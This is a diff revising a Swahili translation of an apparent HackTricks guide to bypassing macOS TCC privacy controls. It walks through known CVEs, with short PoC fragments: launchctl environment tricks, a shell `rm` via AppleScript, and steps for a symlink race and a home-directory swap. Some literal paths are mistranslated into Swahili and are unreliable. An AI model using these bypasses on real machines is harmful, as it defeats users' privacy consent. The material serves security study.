@@ -1,16 +1,16 @@
-# Kupita kwa TCC ya macOS
+# Kupita kwa macOS TCC
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
 
 Njia nyingine za kusaidia HackTricks:
 
-* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
+* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
+* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
+* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 
@@ -18,7 +18,7 @@ Njia nyingine za kusaidia HackTricks:
 
 ### Kupita kwa Kuandika
 
-Hii sio njia ya kupita, ni jinsi TCC inavyofanya kazi: **Haitoi ulinzi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji, bado inaweza kuandika ndani yake**:
+Hii sio njia ya kupita, ni jinsi TCC inavyofanya kazi: **Haitoi ulinzi dhidi ya kuandika**. Ikiwa Terminal **haina ufikiaji wa kusoma Daki ya mtumiaji bado inaweza kuandika ndani yake**:
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -28,53 +28,71 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-**Atributi ya ziada `com.apple.macl`** inaongezwa kwenye **faili mpya** ili kumpa **programu ya muundaji** upatikanaji wa kuisoma.
+**Mkusanyiko wa muda mrefu `com.apple.macl`** huongezwa kwa **faili mpya** ili kumpa **app ya waundaji** upatikanaji wa kuisoma.
 
-### Kupitisha SSH
+### TCC ClickJacking
 
-Kwa chaguo-msingi, upatikanaji kupitia **SSH ulikuwa na "Upatikanaji Kamili wa Diski"**. Ili kuzima hii, unahitaji kuwa na hiyo iliyoorodheshwa lakini imezimwa (kuiondoa kutoka kwenye orodha haitaondoa haki hizo):
+Inawezekana kuweka **dirisha juu ya dirisha la TCC** ili kufanya mtumiaji **kukubali** bila kugundua. Unaweza kupata PoC katika [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
+
+<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
+
+### Ombi la TCC kwa jina la kubahatisha
+
+Mshambuliaji anaweza **kuunda programu zenye jina lolote** (k.m. Finder, Google Chrome...) katika **`Info.plist`** na kufanya iombe upatikanaji wa eneo fulani lililolindwa na TCC. Mtumiaji atadhani kuwa programu halali ndiyo inayoomba upatikanaji huu. Zaidi ya hayo, inawezekana **kuondoa programu halali kutoka Dock na kuweka ile bandia**, hivyo mtumiaji akibofya ile bandia (ambayo inaweza kutumia alama ile ile) inaweza kuita ile halali, kuomba ruhusa za TCC na kutekeleza zisizo, hivyo kumfanya mtumiaji aamini kuwa programu halali ndiyo iliyoomba upatikanaji.
+
+<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>
+
+Maelezo zaidi na PoC katika:
+
+{% content-ref url="../../../macos-privilege-escalation.md" %}
+[macos-privilege-escalation.md](../../../macos-privilege-escalation.md)
+{% endcontent-ref %}
+
+### Kupuuza SSH
+
+Kwa chaguo-msingi, upatikanaji kupitia **SSH ulikuwa na "Full Disk Access"**. Ili kulemaza hii unahitaji kuwa imeorodheshwa lakini imelemazwa (kuiondoa kwenye orodha haitaondoa ruhusa hizo):
 
 ![](<../../../../../.gitbook/assets/image (569).png>)
 
-Hapa unaweza kupata mifano ya jinsi **malwares zingine zilivyoweza kuepuka ulinzi huu**:
+Hapa unaweza kupata mifano ya jinsi baadhi ya **malware zimefanikiwa kupuuza ulinzi huu**:
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 {% hint style="danger" %}
-Tafadhali kumbuka kuwa sasa, ili kuweza kuwezesha SSH unahitaji **Upatikanaji Kamili wa Diski**
+Tafadhali elewa kuwa sasa, ili kuweza kuwezesha SSH unahitaji **Full Disk Access**
 {% endhint %}
 
-### Kusimamia Upanuzi - CVE-2022-26767
+### Kusimamia viendelezi - CVE-2022-26767
 
-Atributi ya **`com.apple.macl`** inatolewa kwa faili ili kumpa **programu fulani ruhusa ya kuisoma.** Atributi hii inawekwa wakati wa **kuburuta na kuacha** faili juu ya programu, au wakati mtumiaji anapofungua faili kwa **kubofya mara mbili** na kuifungua na **programu ya chaguo-msingi**.
+Mkusanyiko wa muda mrefu **`com.apple.macl`** unapewa faili ili kumpa **programu fulani ruhusa ya kuisoma.** Mkusanyiko huu unawekwa wakati wa **kuburuta\&kushusha** faili juu ya programu, au wakati mtumiaji **anabofya mara mbili** faili kufungua na programu ya **msingi**.
 
-Kwa hivyo, mtumiaji anaweza **kujiandikisha programu mbaya** kusimamia upanuzi wote na kuita Huduma za Kuzindua kufungua faili yoyote (kwa hivyo faili mbaya itapewa upatikanaji wa kuisoma).
+Hivyo, mtumiaji anaweza **kujiandikisha programu yenye nia mbaya** kusimamia viendelezi vyote na kuita Huduma za Kuanzisha kufungua **faili yoyote** (hivyo faili ya nia mbaya itapewa ruhusa ya kuisoma).
 
 ### iCloud
 
-Kwa kibali cha **`com.apple.private.icloud-account-access`**, niwezekanavyo kuwasiliana na huduma ya XPC ya **`com.apple.iCloudHelper`** ambayo itatoa **vitambulisho vya iCloud**.
+Kwa ruhusa ya **`com.apple.private.icloud-account-access`** inawezekana kuwasiliana na huduma ya XPC ya **`com.apple.iCloudHelper`** ambayo itatoa **vibali vya iCloud**.
 
-**iMovie** na **Garageband** walikuwa na kibali hiki na vingine vilivyowezesha.
+**iMovie** na **Garageband** walikuwa na ruhusa hii na nyingine zilizoruhusiwa.
 
-Kwa habari zaidi kuhusu uvumbuzi wa **kupata vitambulisho vya iCloud** kutoka kwa kibali hicho, angalia mazungumzo: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Kwa maelezo zaidi kuhusu udanganyifu wa **kupata vibali vya iCloud** kutoka kwa ruhusa hiyo, angalia mazungumzo: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
-### kTCCServiceAppleEvents / Automation
+### kTCCServiceAppleEvents / Uendeshaji
 
-Programu yenye kibali cha **`kTCCServiceAppleEvents`** itaweza **kudhibiti Programu nyingine**. Hii inamaanisha kuwa inaweza kuwa na uwezo wa **kutumia vibaya ruhusa zilizotolewa kwa Programu nyingine**.
+Programu yenye ruhusa ya **`kTCCServiceAppleEvents`** itaweza **kudhibiti Programu nyingine**. Hii inamaanisha inaweza **kutumia vibali vilivyotolewa kwa Programu nyingine**.
 
-Kwa habari zaidi kuhusu Apple Scripts angalia:
+Kwa maelezo zaidi kuhusu Skripti za Apple angalia:
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-Kwa mfano, ikiwa Programu ina **ruhusa ya Utoaji wa Automation juu ya `iTerm`**, kwa mfano katika mfano huu **`Terminal`** ina upatikanaji juu ya iTerm:
+Kwa mfano, ikiwa Programu ina **ruhusa ya Uendeshaji juu ya `iTerm`**, kama ilivyo katika mfano huu **`Terminal`** ina upatikanaji juu ya iTerm:
 
 <figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Juu ya iTerm
 
-Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kufanya vitendo:
+Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kutekeleza vitendo:
 
 {% code title="iterm.script" %}
 ```applescript
@@ -108,10 +126,10 @@ do shell script "rm " & POSIX path of (copyFile as alias)
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-Mtumiaji wa **tccd daemon** anatumia **`HOME`** **env** kubadilisha kwenye hifadhidata ya watumiaji ya TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+**tccd daemon** wa userland unatumia **`HOME`** **env** variable kufikia database ya watumiaji ya TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa sababu daemon ya TCC inaendeshwa kupitia `launchd` ndani ya kikoa cha mtumiaji wa sasa, ni **inawezekana kudhibiti mazingira yote** yanayopitishwa kwake.\
-Hivyo, **mshambuliaji anaweza kuweka `$HOME` mazingira** kwenye **`launchctl`** ili ielekeze kwenye **folda iliyodhibitiwa**, **kuanzisha tena** daemon ya **TCC**, na kisha **kubadilisha moja kwa moja hifadhidata ya TCC** ili kujipatia **kila haki ya TCC inayopatikana** bila kuuliza mtumiaji mwisho.\
+Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa sababu tccd daemon inaendeshwa kupitia `launchd` ndani ya uwanja wa mtumiaji wa sasa, ni **inawezekana kudhibiti mazingira yote** yanayopitishwa kwake.\
+Hivyo, **mshambuliaji anaweza kuweka `$HOME` mazingira** variable katika **`launchctl`** ili kuelekeza kwa **directory iliyodhibitiwa**, **kuanzisha upya** tccd daemon, na kisha **kurekebisha moja kwa moja database ya TCC** ili kujipa **kila ruhusa ya TCC inayopatikana** bila kuuliza mtumiaji mwisho.\
 PoC:
 ```bash
 # reset database just in case (no cheating!)
@@ -141,88 +159,90 @@ $> ls ~/Documents
 ```
 ### CVE-2021-30761 - Maelezo
 
-Maelezo yalikuwa na ufikiaji wa maeneo yaliyolindwa na TCC lakini wakati maelezo yanapotengenezwa, yanatengenezwa katika eneo lisilolindwa. Kwa hivyo, unaweza kuomba maelezo kuiga faili iliyolindwa katika maelezo (kwa hivyo katika eneo lisilolindwa) na kisha kupata faili hiyo:
+Maelezo yalikuwa na ufikiaji wa maeneo yaliyolindwa na TCC lakini wakati maelezo yanapotengenezwa hii **hutengenezwa katika eneo lisilolindwa**. Kwa hivyo, ungeweza kuomba maelezo kuiga faili iliyolindwa katika maelezo (hivyo katika eneo lisilolindwa) na kisha kupata ufikiaji wa faili:
 
 <figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 ### CVE-2021-30782 - Uhamishaji
 
-Binary `/usr/libexec/lsd` na maktaba `libsecurity_translocate` ilikuwa na ruhusa ya `com.apple.private.nullfs_allow` ambayo iliruhusu kuunda mlima wa **nullfs** na ilikuwa na ruhusa ya `com.apple.private.tcc.allow` na **`kTCCServiceSystemPolicyAllFiles`** ili kupata faili zote.
+Binary `/usr/libexec/lsd` pamoja na maktaba `libsecurity_translocate` ilikuwa na ruhusa ya `com.apple.private.nullfs_allow` ambayo iliruhusu kuunda **nullfs** mount na ilikuwa na ruhusa ya `com.apple.private.tcc.allow` na **`kTCCServiceSystemPolicyAllFiles`** kufikia kila faili.
 
-Ilikuwa inawezekana kuongeza sifa ya karantini kwa "Library", kuita huduma ya XPC ya **`com.apple.security.translocation`** na kisha itaunganisha Library na **`$TMPDIR/AppTranslocation/d/d/Library`** ambapo nyaraka zote ndani ya Library zinaweza **kupatikana**.
+Ilikuwa inawezekana kuongeza sifa ya karantini kwa "Library", kuita huduma ya XPC ya **`com.apple.security.translocation`** na kisha itaunganisha Library na **`$TMPDIR/AppTranslocation/d/d/Library`** ambapo nyaraka zote ndani ya Library zingeweza **kufikiwa**.
 
-### CVE-2023-38571 - Muziki na TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
+### CVE-2023-38571 - Muziki & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
 
-**`Muziki`** ina kipengele kizuri: Wakati inafanya kazi, ita **ingiza** faili zilizodondoshwa kwenye **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** kwenye "maktaba ya media" ya mtumiaji. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:
+**`Muziki`** ina kipengele kizuri: Wakati inaendeshwa, ita **ingiza** faili zilizoporwa kwa **`~/Muziki/Muziki/Media.localized/Automatically Add to Music.localized`** kwenye "maktaba ya media" ya mtumiaji. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:
 
-* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
-* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`
+* `a = "~/Muziki/Muziki/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
+* `b = "~/Muziki/Muziki/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`
 
-Tabia hii ya **`rename(a, b);`** ni hatari kwa **Mzunguko wa Mashindano**, kwani inawezekana kuweka faili bandia ya **TCC.db** ndani ya folda ya `Automatically Add to Music.localized` na kisha wakati folda mpya (b) inapoundwa ili kuiga faili, ifuta faili hiyo, na ielekeze kwenye **`~/Library/Application Support/com.apple.TCC`**/.
+Hii **`rename(a, b);`** inayotenda ni dhaifu kwa **Hali ya Mashindano**, kwani inawezekana kuweka faili bandia ya **TCC.db** ndani ya folda ya `Automatically Add to Music.localized` na kisha wakati folda mpya (b) inapotengenezwa kuchukua faili, ifute, na ielekeze kwenye **`~/Library/Application Support/com.apple.TCC`**/.
 
 ### SQLITE\_SQLLOG\_DIR - CVE-2023-32422
 
-Ikiwa **`SQLITE_SQLLOG_DIR="njia/folder"`** inamaanisha kwamba **db yoyote iliyofunguliwa inakopiwa kwenye njia hiyo**. Katika CVE hii, udhibiti huu ulitumiwa vibaya kuandika ndani ya **database ya SQLite** ambayo itafunguliwa na mchakato na FDA ya database ya TCC, na kisha kutumia **`SQLITE_SQLLOG_DIR`** na symlink kwenye jina la faili ili wakati database hiyo inapofunguliwa, faili ya mtumiaji **TCC.db inaandikwa juu** ya ile iliyofunguliwa.\
-**Maelezo zaidi** [**katika andiko**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na**[ **katika mazungumzo**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).
+Ikiwa **`SQLITE_SQLLOG_DIR="njia/folder"`** inamaanisha kwamba **db yoyote iliyofunguliwa inakopiwa kwenye njia hiyo**. Katika CVE hii, udhibiti huu ulitumika vibaya kwa **kuandika** ndani ya **SQLite database** ambayo itafunguliwa na mchakato wenye FDA ya database ya TCC, na kisha kutumia **`SQLITE_SQLLOG_DIR`** na **symlink katika jina la faili** hivyo wakati hiyo database inapofunguliwa, **TCC.db ya mtumiaji inaandikwa upya** na ile iliyofunguliwa.\
+**Maelezo zaidi** [**katika andiko**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na** [**katika mazungumzo**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).
 
 ### **SQLITE\_AUTO\_TRACE**
 
-Ikiwa mazingira ya **`SQLITE_AUTO_TRACE`** yameset, maktaba ya **`libsqlite3.dylib`** itaanza **kurekodi** maswali yote ya SQL. Programu nyingi za Apple zilitumia maktaba hii kuwa na ufikiaji wa habari zilizolindwa na TCC.
+Ikiwa mazingira ya kimazingira **`SQLITE_AUTO_TRACE`** yameset, maktaba **`libsqlite3.dylib`** itaanza **kurekodi** maombi yote ya SQL. Programu nyingi za Apple zilitumia maktaba hii, hivyo ilikuwa inawezekana kurekodi maombi yote yao ya SQLite.
+
+Programu kadhaa za Apple zilitumia maktaba hii kufikia habari zilizolindwa na TCC.
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407
+### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
 
-**Hii variable ya mazingira inatumika na mfumo wa `Metal`** ambao ni tegemezi kwa programu mbalimbali, hasa `Music`, ambayo ina FDA.
+Hii **variable ya mazingira hutumiwa na mfumo wa `Metal`** ambao ni tegemezi kwa programu mbalimbali, hasa `Music`, ambayo ina FDA.
 
-Kwa kuweka yafuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="njia/jina"`. Ikiwa `njia` ni saraka halali, kosa litasababishwa na tunaweza kutumia `fs_usage` kuona kinachoendelea katika programu:
+Kuweka yafuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="njia/jina"`. Ikiwa `njia` ni saraka halali, kosa litazinduliwa na tunaweza kutumia `fs_usage` kuona kinachoendelea katika programu:
 
-* faili itafunguliwa (`open()`), itaitwa `njia/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
+* faili itafunguliwa kwa `open()`, itaitwa `njia/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
 * moja au zaidi ya `write()` itaandika maudhui kwenye faili (hatudhibiti hii)
-* `njia/.dat.nosyncXXXX.XXXXXX` itabadilishwa jina (`rename()`) kuwa `njia/jina`
+* `njia/.dat.nosyncXXXX.XXXXXX` itabadilishwa jina kwa `rename()` kuwa `njia/jina`
 
-Hii ni kuandika faili ya muda mfupi, ikifuatiwa na **`rename(old, new)`** **ambayo sio salama**.
+Ni andishi la faili la muda, ikifuatiwa na **`rename(old, new)`** **ambayo si salama.**
 
-Sio salama kwa sababu inahitaji **kutatua njia za zamani na mpya kwa tofauti**, ambayo inaweza kuchukua muda na inaweza kuwa na hatari ya Mashindano ya Hali. Kwa maelezo zaidi unaweza kuangalia kazi ya `xnu` inayoitwa `renameat_internal()`.
+Si salama kwa sababu inahitaji **kutatua njia za zamani na mpya kwa kujitegemea**, ambayo inaweza kuchukua muda na kuwa hatarini kwa Mashindano ya Hali. Kwa maelezo zaidi unaweza kuchunguza kazi ya `xnu` `renameat_internal()`.
 
 {% hint style="danger" %}
-Kwa hiyo, kimsingi, ikiwa mchakato wenye mamlaka anabadilisha jina kutoka kwenye saraka unayodhibiti, unaweza kushinda RCE na kufanya iweze kufikia faili tofauti au, kama katika CVE hii, kufungua faili ambayo programu yenye mamlaka imeunda na kuhifadhi FD.
+Kwa hiyo, kimsingi, ikiwa mchakato uliopewa mamlaka unabadilisha jina kutoka kwenye folda unayoidhibiti, unaweza kushinda RCE na kufanya iweze kufikia faili tofauti au, kama katika CVE hii, kufungua faili ambayo programu iliyopewa mamlaka imeunda na kuhifadhi FD.
 
-Ikiwa jina la kubadilisha linapata saraka unayodhibiti, wakati umebadilisha faili ya chanzo au una FD kwake, unabadilisha faili ya marudio (au saraka) ili iweze kuonyesha kiungo cha ishara, ili uweze kuandika wakati wowote unapotaka.
+Ikiwa kubadilisha jina kunafikia folda unayoidhibiti, wakati umebadilisha faili ya chanzo au una FD kwake, unaweza kubadilisha faili ya marudio (au folda) kuashiria kiungo, ili uweze kuandika wakati wowote unavyotaka.
 {% endhint %}
 
-Hii ilikuwa shambulio katika CVE: Kwa mfano, ili kubadilisha `TCC.db` ya mtumiaji, tunaweza:
+Hii ilikuwa shambulio katika CVE: Kwa mfano, kubadilisha `TCC.db` ya mtumiaji, tunaweza:
 
-* kuunda `/Users/hacker/ourlink` ili ionyeshe kwa `/Users/hacker/Library/Application Support/com.apple.TCC/`
+* kuunda `/Users/hacker/kiunganishi chetu` ili kuashiria `/Users/hacker/Library/Application Support/com.apple.TCC/`
 * kuunda saraka `/Users/hacker/tmp/`
 * kuweka `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
-* kusababisha kosa kwa kukimbia `Music` na hii env var
-* kuchukua `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
-* hapa pia tunafungua (`open()`) faili hii kwa kuandika, na kushikilia file descriptor
-* kubadilisha kwa atomiki `/Users/hacker/tmp` na `/Users/hacker/ourlink` **katika mzunguko**
-* tunafanya hivi ili kuongeza nafasi zetu za kufanikiwa kwani dirisha la mashindano ni dogo sana, lakini kupoteza mashindano hakuna madhara yoyote
+* kuzindua kosa kwa kukimbia `Music` na hii variable ya mazingira
+* kufuatilia `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
+* hapa pia tunafungua faili hii kwa kuandika, na kushikilia nambari ya faili
+* kubadilisha `/Users/hacker/tmp` na `/Users/hacker/kiunganishi chetu` **kwa mzunguko**
+* tunafanya hivi ili kuongeza nafasi zetu za kufanikiwa kwani dirisha la mashindano ni dogo sana, lakini kupoteza mashindano hakuna hasara kubwa
 * subiri kidogo
-* jaribu kama tumepata bahati
-* ikiwa sivyo, endesha tena kutoka mwanzo
+* jaribu kuona ikiwa tulifanikiwa
+* ikiwa la, endesha tena kutoka mwanzo
 
-Maelezo zaidi katika [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)
+Maelezo zaidi kwenye [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)
 
 {% hint style="danger" %}
-Sasa, ikiwa unajaribu kutumia variable ya mazingira `MTL_DUMP_PIPELINES_TO_JSON_FILE`, programu hazitazinduliwa
+Sasa, ikiwa unajaribu kutumia variable ya mazingira `MTL_DUMP_PIPELINES_TO_JSON_FILE` programu hazitazinduliwa
 {% endhint %}
 
 ### Apple Remote Desktop
 
-Kama mtumiaji mkuu unaweza kuwezesha huduma hii na **ARD agent itakuwa na ufikiaji kamili wa diski** ambao unaweza kutumiwa vibaya na mtumiaji ili kuifanya ichukue nakala mpya ya **TCC user database**.
+Kama mtumiaji wa mizizi unaweza kuwezesha huduma hii na **ARD agent atakuwa na ufikivu kamili wa diski** ambao kisha unaweza kutumia vibaya kufanya ipige nakala ya **database ya mtumiaji wa TCC mpya**.
 
-## Kwa njia ya **NFSHomeDirectory**
+## Kwa **NFSHomeDirectory**
 
-TCC inatumia database katika saraka ya HOME ya mtumiaji ili kudhibiti ufikiaji wa rasilimali maalum kwa mtumiaji katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
-Kwa hiyo, ikiwa mtumiaji anaweza kuanzisha upya TCC na variable ya mazingira ya $HOME ikielekeza kwenye **saraka tofauti**, mtumiaji anaweza kuunda database mpya ya TCC katika **/Library/Application Support/com.apple.TCC/TCC.db** na kudanganya TCC ili itoe ruhusa ya TCC yoyote kwa programu yoyote.
+TCC hutumia database katika folda ya HOME ya mtumiaji kudhibiti ufikivu wa rasilimali maalum kwa mtumiaji katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
+Kwa hiyo, ikiwa mtumiaji anafanikiwa kuanzisha upya TCC na variable ya mazingira ya $HOME ikielekeza kwa **folda tofauti**, mtumiaji anaweza kuunda database mpya ya TCC katika **/Library/Application Support/com.apple.TCC/TCC.db** na kudanganya TCC kutoa ruhusa ya TCC kwa programu yoyote.
 
 {% hint style="success" %}
-Tafadhali kumbuka kuwa Apple inatumia mipangilio iliyohifadhiwa ndani ya wasifu wa mtumiaji katika sifa ya **`NFSHomeDirectory`** kama **thamani ya `$HOME`**, kwa hivyo ikiwa unahatarisha programu na ruhusa ya kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kutumia** chaguo hili na kuepuka TCC.
+Tafadhali kumbuka kuwa Apple hutumia mipangilio iliyohifadhiwa ndani ya wasifu wa mtumiaji katika sifa ya **`NFSHomeDirectory`** kwa **thamani ya `$HOME`**, kwa hivyo ikiwa unahatarisha programu na ruhusa ya kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kuifanya iwe silaha** na kufanya upitishaji wa TCC.
 {% endhint %}
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
@@ -231,28 +251,43 @@ Tafadhali kumbuka kuwa Apple inatumia mipangilio iliyohifadhiwa ndani ya wasifu 
 
 ### CVE-2021-30970 - Powerdir
 
-**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha saraka ya **HOME** ya mtumiaji.
+**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha folda ya **HOME** ya mtumiaji.
 
 1. Pata _csreq_ blob kwa programu ya lengo.
-2. Weka faili bandia ya _TCC.db_ na ufikiaji unaohitajika na _csreq_ blob.
-3. Toa kuingia kwa Huduma za Saraka ya mtumiaji na [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
-4. Badilisha kuingia kwa Huduma za Saraka kubadilisha saraka ya nyumbani ya mtumiaji.
-5. Ingiza kuingia iliyobadilishwa ya Huduma za Saraka na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
+2. Panda faili bandia ya _TCC.db_ na ufikivu unaohitajika na blob ya _csreq_.
+3. Toa kuingia kwa Huduma za Anwani za Mtumiaji na [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
+4. Badilisha kuingia kwa Huduma za Anwani kubadilisha saraka ya nyumbani ya mtumiaji.
+5. Ingiza kuingia iliyobadilishwa kwa Huduma za Anwani na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
 6. Acha _tccd_ ya mtumiaji na zima upya mchakato.
 
-POC ya pili iliyotumika **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` na thamani ya `kTCCServiceSystemPolicySysAdminFiles`.\
-Ilikuwa inawezekana kuendesha **`configd`** na chaguo la **`-t`**, mshambuliaji anaweza kubainisha **Bundle desturi ya kupakia**. Kwa hivyo, shambulio linabadilisha njia ya kubadilisha saraka ya nyumbani ya mtumiaji kwa kutumia **`configd` code injection**.
+POC ya pili iliyotumia **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` na thamani ya `kTCCServiceSystemPolicySysAdminFiles`.\
+Ilikuwa inawezekana kuendesha **`configd`** na chaguo la **`-t`**, mshambuliaji angeweza kutaja **Bundle ya kawaida ya kupakia**. Kwa hivyo, shambulio hilo **inabadilisha** njia ya **`dsexport`** na **`dsimport`** ya kubadilisha saraka ya nyumbani ya mtumiaji na **kuingiza msimbo wa configd**.
 
 Kwa maelezo zaidi angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
 
 ## Kwa kuingiza mchakato
 
